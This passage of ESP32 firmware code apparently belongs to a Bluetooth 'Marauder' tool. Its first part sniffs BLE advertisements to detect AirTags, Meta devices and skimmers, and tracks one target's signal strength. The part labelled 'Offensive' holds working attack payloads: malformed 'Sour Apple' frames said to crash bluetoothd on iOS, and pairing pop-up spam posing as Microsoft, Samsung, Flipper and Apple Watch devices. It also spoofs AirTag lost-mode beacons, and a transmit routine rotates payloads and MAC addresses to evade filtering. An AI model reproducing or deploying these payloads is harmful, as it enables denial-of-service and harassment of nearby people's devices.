                s.find("FEF4") != std::string::npos) { reason = 1; break; }
        }
    }
    if (!reason && dev->haveManufacturerData()) {
        std::string md = dev->getManufacturerData();
        if (md.size() >= 2) {
            uint16_t id = (uint8_t)md[0] | ((uint8_t)md[1] << 8);
            if (id == 0x0131) reason = 2;     // Facebook
            else if (id == 0x0759) reason = 2; // Meta Platforms
        }
    }
    if (!reason && dev->haveName()) {
        std::string n = dev->getName();
        if (bleNamePrefixMatchCaseInsensitive(n.c_str(), "Quest") ||
            bleNamePrefixMatchCaseInsensitive(n.c_str(), "Meta") ||
            bleNamePrefixMatchCaseInsensitive(n.c_str(), "Oculus") ||
            bleNamePrefixMatchCaseInsensitive(n.c_str(), "Portal")) reason = 3;
    }
    if (!reason) return;

    std::string addr = dev->getAddress().toString();
    for (int i = 0; i < bleMetaCount; i++) {
        if (strncmp(bleMetas[i].addr, addr.c_str(), 17) == 0) {
            bleMetas[i].rssi = dev->getRSSI();
            return;
        }
    }
    if (bleMetaCount >= BLE_META_MAX) return;
    BleMetaEntry &e = bleMetas[bleMetaCount++];
    std::string n = dev->haveName() ? dev->getName() : std::string("(unknown)");
    strncpy(e.name, n.c_str(), sizeof(e.name) - 1);
    e.name[sizeof(e.name) - 1] = 0;
    strncpy(e.addr, addr.c_str(), sizeof(e.addr) - 1);
    e.addr[sizeof(e.addr) - 1] = 0;
    e.rssi = dev->getRSSI();
    e.reason = reason;
    e.firstSeenMs = millis();
}

static inline void bleMonitorRecord(NimBLEAdvertisedDevice *dev) {
    if (bleMonitorTargetAddr[0] == 0) return;
    std::string addr = dev->getAddress().toString();
    if (!bleAddrEqualsCaseInsensitive(addr.c_str(), bleMonitorTargetAddr)) return;
    int idx = bleMonitorIdx % BLE_MONITOR_SAMPLES;
    bleMonitorRssi[idx] = (int8_t)dev->getRSSI();
    bleMonitorMs[idx] = millis();
    bleMonitorIdx++;
    if (bleMonitorCount < BLE_MONITOR_SAMPLES) bleMonitorCount++;
    bleMonitorLastRssi = (int8_t)dev->getRSSI();

    // Parse TX power from FindMy payload if present
    if (dev->haveManufacturerData()) {
        std::string md = dev->getManufacturerData();
        bool isLost = false; int8_t tx = -59;
        if (bleIsAirTagPayload(md, &isLost, &tx)) bleMonitorTxPower = tx;
    }
    bleMonitorDistance = bleEstimateDistance(bleMonitorLastRssi, bleMonitorTxPower);
}

// ---------------------------------------------------------------
// NimBLE advertised-device callback (runs on host task)
// ---------------------------------------------------------------
class BleMarauderScanCb : public NimBLEAdvertisedDeviceCallbacks {
public:
    void onResult(NimBLEAdvertisedDevice* dev) override {
        if (bleMarauderMode == BLE_MAR_OFF) return;
        if (!bleMarLock(20)) return;

        switch (bleMarauderMode) {
            case BLE_MAR_AIRTAG_SNIFF:
                if (dev->haveManufacturerData()) {
                    std::string md = dev->getManufacturerData();
                    bool isLost = false; int8_t tx = -59;
                    if (bleIsAirTagPayload(md, &isLost, &tx)) {
                        bleAirtagRecord(dev, md, isLost, tx);
                    }
                }
                break;
            case BLE_MAR_AIRTAG_MONITOR:
                bleMonitorRecord(dev);
                break;
            case BLE_MAR_SKIMMER:
                bleSkimmerRecord(dev);
                break;
            case BLE_MAR_FLOCK:
                bleFlockRecord(dev);
                break;
            case BLE_MAR_META:
                bleMetaRecord(dev);
                break;
            case BLE_MAR_ANALYZER:
                bleAnalyzerRecord(dev);
                break;
            default: break;
        }
        bleMarUnlock();
    }
};

static BleMarauderScanCb bleMarauderScanCb;
static bool bleMarauderScanRegistered = false;

// ---------------------------------------------------------------
// Start a continuous (duration=0) Marauder scan in the chosen mode.
// Must be called from Core 1 main loop with BLE stack initialized.
// ---------------------------------------------------------------
inline bool BleMarStartScan(uint8_t mode) {
    if (!bleInitialized) return false;
    NimBLEScan *pScan = NimBLEDevice::getScan();
    if (!pScan) return false;

    bleMarMutexInit();
    bleMarLock(100);
    bleMarauderMode = mode;
    bleMarUnlock();

    pScan->setActiveScan(true);
    pScan->setInterval(80);
    pScan->setWindow(60);
    pScan->setDuplicateFilter(false);  // need every advertisement
    if (!bleMarauderScanRegistered) {
        pScan->setAdvertisedDeviceCallbacks(&bleMarauderScanCb, true);
        bleMarauderScanRegistered = true;
    }
    pScan->start(0, nullptr, false);   // duration=0 → forever, non-blocking
    return true;
}

inline void BleMarStopScan() {
    NimBLEScan *pScan = NimBLEDevice::getScan();
    if (pScan) pScan->stop();
    bleMarLock(100);
    bleMarauderMode = BLE_MAR_OFF;
    bleMarUnlock();
}

// ---------------------------------------------------------------
// Offensive: Sour Apple
// Broadcasts a malformed Apple "continuity" frame with garbage
// in the action subtype + oversize payload. Some iOS versions
// crash bluetoothd when processing this. Variant set rotates.
// ---------------------------------------------------------------
static const uint8_t bleSourAppleA[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x0f, 0x05, 0xc1, 0xff,
    0x60, 0x4c, 0x95, 0xff, 0xff, 0x10, 0x00, 0xee,
    0xee, 0xee, 0xee, 0xee, 0xee, 0xee, 0xee, 0xee,
    0xee, 0xee, 0xee, 0xee, 0xee, 0xee, 0xee
};
static const uint8_t bleSourAppleB[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0xff,
    0x20, 0x75, 0xaa, 0x30, 0x01, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
};
static const uint8_t bleSourAppleC[] = {
    0x1e, 0xff, 0x4c, 0x00, 0x0c, 0x0e, 0x09, 0xa3,
    0xb7, 0x4d, 0x9a, 0x6c, 0xab, 0x33, 0xc2, 0xfe,
    0x40, 0x4d, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
static const uint8_t *bleSourApplePayloads[] = {
    bleSourAppleA, bleSourAppleB, bleSourAppleC
};
#define BLE_SOUR_APPLE_COUNT 3

// SwiftPair (Microsoft) advertisement template.
// Format: <len> 0xFF <mfgID=0x06 0x00> <beacon=0x03> <subtype=0x00>
// <reserved=0x80> <vendor-id=0x03 0x00> <device-name UTF8...>
// Build dynamically with random name suffix to avoid duplicate filter.
static uint8_t bleSwiftPairBuf[31];
static const char *bleSwiftPairNames[] = {
    "Surface Headphones", "Surface Earbuds", "Xbox Wireless Controller",
    "Surface Precision Mouse", "Surface Arc Mouse", "Surface Pen",
    "Bluetooth Mouse", "Bluetooth Keyboard"
};
#define BLE_SWIFTPAIR_NAME_COUNT 8

inline uint8_t BleBuildSwiftPair(int slot) {
    const char *name = bleSwiftPairNames[slot % BLE_SWIFTPAIR_NAME_COUNT];
    size_t nameLen = strlen(name);
    if (nameLen > 22) nameLen = 22;
    uint8_t total = 8 + nameLen;   // including length byte
    bleSwiftPairBuf[0] = total - 1; // AD length excludes itself
    bleSwiftPairBuf[1] = 0xFF;      // manufacturer specific
    bleSwiftPairBuf[2] = 0x06;      // Microsoft mfg id LSB
    bleSwiftPairBuf[3] = 0x00;
    bleSwiftPairBuf[4] = 0x03;      // beacon ID for SwiftPair
    bleSwiftPairBuf[5] = 0x00;      // subtype
    bleSwiftPairBuf[6] = 0x80;      // reserved RSSI
    bleSwiftPairBuf[7] = 0x03;      // vendor id
    memcpy(&bleSwiftPairBuf[8], name, nameLen);
    return total;
}

// Expanded spam — Samsung Buds variants, Flipper pairing, Watch
static const uint8_t bleSpamSamsungBuds[]    = {0x1b,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x06,0x3d,0x77,0x91,0x44,0x47,0xa5,0xd7,0x09,0xa4,0xab,0x0b};
static const uint8_t bleSpamGalaxyBudsLive[] = {0x1b,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0xa1,0x01,0x09,0x95,0x06,0x3d,0x77,0x91,0x44,0x47,0xa5,0xd7,0x09,0xa4,0xab,0x0b};
static const uint8_t bleSpamGalaxyBudsPro[]  = {0x1b,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0xb6,0x01,0x09,0xb5,0x06,0x3d,0x77,0x91,0x44,0x47,0xa5,0xd7,0x09,0xa4,0xab,0x0b};
static const uint8_t bleSpamGalaxyBuds2[]    = {0x1b,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0xa6,0x01,0x09,0xc5,0x06,0x3d,0x77,0x91,0x44,0x47,0xa5,0xd7,0x09,0xa4,0xab,0x0b};
// Flipper Zero pairing: it advertises with manufacturer 0x074F (Flipper Devices)
static const uint8_t bleSpamFlipper[]        = {0x14,0xff,0x4f,0x07,0x46,0x6c,0x69,0x70,0x70,0x65,0x72,0x20,0x5a,0x65,0x72,0x6f,0x20,0x00,0x00,0x00,0x00};
// Apple Watch popup (uses Apple continuity proximity 0x05)
static const uint8_t bleSpamAppleWatch[]     = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x07,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};

struct BleSpamPlusEntry {
    const uint8_t *data;
    uint8_t len;
    const char *name;
};
static const BleSpamPlusEntry bleSpamPlus[] = {
    {bleSpamSamsungBuds,    sizeof(bleSpamSamsungBuds),    "Samsung Buds"},
    {bleSpamGalaxyBudsLive, sizeof(bleSpamGalaxyBudsLive), "Galaxy Buds Live"},
    {bleSpamGalaxyBudsPro,  sizeof(bleSpamGalaxyBudsPro),  "Galaxy Buds Pro"},
    {bleSpamGalaxyBuds2,    sizeof(bleSpamGalaxyBuds2),    "Galaxy Buds 2"},
    {bleSpamFlipper,        sizeof(bleSpamFlipper),        "Flipper Zero"},
    {bleSpamAppleWatch,     sizeof(bleSpamAppleWatch),     "Apple Watch"},
};
#define BLE_SPAM_PLUS_COUNT (sizeof(bleSpamPlus)/sizeof(bleSpamPlus[0]))

// AirTag spoof — counterfeit FindMy lost-mode beacon. Random key
// is rotated each broadcast to avoid being filtered.
static uint8_t bleAirTagSpoofBuf[31];
inline void BleBuildAirTagSpoof() {
    // Apple AirTag "lost mode" frame: 1e ff 4c 00 12 19 <22 bytes pubkey> <status> <hint>
    bleAirTagSpoofBuf[0] = 0x1e;
    bleAirTagSpoofBuf[1] = 0xff;
    bleAirTagSpoofBuf[2] = 0x4c;
    bleAirTagSpoofBuf[3] = 0x00;
    bleAirTagSpoofBuf[4] = 0x12;       // FindMy
    bleAirTagSpoofBuf[5] = 0x19;       // length
    // 22 bytes of public key (random)
    for (int i = 0; i < 22; i++) bleAirTagSpoofBuf[6 + i] = (uint8_t)esp_random();
    bleAirTagSpoofBuf[28] = 0xC1;      // status / hint
    bleAirTagSpoofBuf[29] = 0x00;
    bleAirTagSpoofBuf[30] = 0x00;
}

// Generic mode-specific advertise tick. Each call rotates the payload
// (and the random MAC) to make each ad look like a new device, but the
// advertising itself stays running between calls so iOS / Windows
// scanners actually catch the radio in their scan windows. The caller
// is expected to throttle ticks to ~150-200 ms so the radio actually
// gets to transmit a few ads with each payload before the next swap.
inline int BleMarAdvertiseTick(uint8_t mode, int *rotState) {
    if (!pAdvertising) {
        Serial.println("[BleMarAdvTick] pAdvertising is null — BLEinit not run?");
        return 0;
    }

    NimBLEAdvertisementData data;
    const char *modeName = "?";
    switch (mode) {
        case BLE_MAR_SOUR_APPLE: {
            modeName = "SourApple";
            const uint8_t *p = bleSourApplePayloads[(*rotState) % BLE_SOUR_APPLE_COUNT];
            data.addData(std::string((const char*)p, 31));
            break;
        }
        case BLE_MAR_SWIFTPAIR: {
            modeName = "SwiftPair";
            uint8_t len = BleBuildSwiftPair(*rotState);
            data.addData(std::string((const char*)bleSwiftPairBuf, len));
            break;
        }
        case BLE_MAR_SPAM_PLUS: {
            const BleSpamPlusEntry &e = bleSpamPlus[(*rotState) % BLE_SPAM_PLUS_COUNT];
            modeName = e.name;
            data.addData(std::string((const char*)e.data, e.len));
            break;
        }
        case BLE_MAR_AIRTAG_SPOOF: {
            modeName = "AirTag";
            BleBuildAirTagSpoof();
            data.addData(std::string((const char*)bleAirTagSpoofBuf, 31));
            break;
        }
        default:
            return 0;
    }

    // Stop just long enough to swap data + roll MAC, then start. Crucially:
    // we don't stop again at the end of the tick — the radio stays on the
    // air until the next swap, so the iPhone has a real chance to catch it.
    pAdvertising->stop();
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM, true);
    pAdvertising->setAdvertisementData(data);
    bool started = pAdvertising->start();
    if ((*rotState) % 10 == 0) {  // dump every 10th rotation
        Serial.printf("[BleMarAdv] mode=%s rot=%d start=%s\n",
                      modeName, *rotState, started ? "ok" : "FAIL");
    }
    (*rotState)++;
    return 1;
}

#endif
